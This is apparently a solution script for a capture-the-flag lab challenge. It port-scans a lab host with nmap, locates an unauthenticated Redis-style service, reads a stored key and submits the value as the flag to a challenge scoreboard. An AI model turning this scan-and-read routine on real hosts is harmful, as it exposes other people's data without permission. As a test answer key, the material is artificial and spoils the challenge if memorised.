#!/bin/sh
set -eu

TARGET=172.20.0.141
FLAG=$(python3 - "$TARGET" <<'PY'
import re
import socket
import subprocess
import sys

host = sys.argv[1]
scan = subprocess.run(
    ["nmap", "-Pn", "-n", "-sT", "-p-", "--open", "-oG", "-", host],
    check=True,
    capture_output=True,
    text=True,
    timeout=180,
).stdout
ports = sorted({int(port) for port in re.findall(r"(\d+)/open/tcp", scan)})

for port in ports:
    try:
        with socket.create_connection((host, port), timeout=2) as sock:
            sock.settimeout(2)
            sock.sendall(b"PING\r\n")
            response = sock.recv(128)
        if response != b"+PONG\r\n":
            continue

        with socket.create_connection((host, port), timeout=2) as sock:
            sock.settimeout(2)
            sock.sendall(b"GET archive:sector7\r\n")
            response = sock.recv(4096)
        match = re.fullmatch(rb"\$(\d+)\r\n(.*?)\r\n", response, re.DOTALL)
        if not match:
            raise RuntimeError("Archive record was not a Redis bulk string")
        length = int(match.group(1))
        value = match.group(2)
        if len(value) != length:
            raise RuntimeError("Incomplete archive record")
        print(value.decode("utf-8"))
        break
    except (OSError, subprocess.TimeoutExpired):
        continue
else:
    raise SystemExit("Could not identify the archive service")
PY
)

curl -s http://172.20.0.3/api/challenges/submit -X POST -H 'Content-Type: application/json' \
  --data-binary "{\"challenge_id\":\"scl-challenge-frame-e3dd49\",\"task_id\":\"task1\",\"flag\":\"$FLAG\"}"
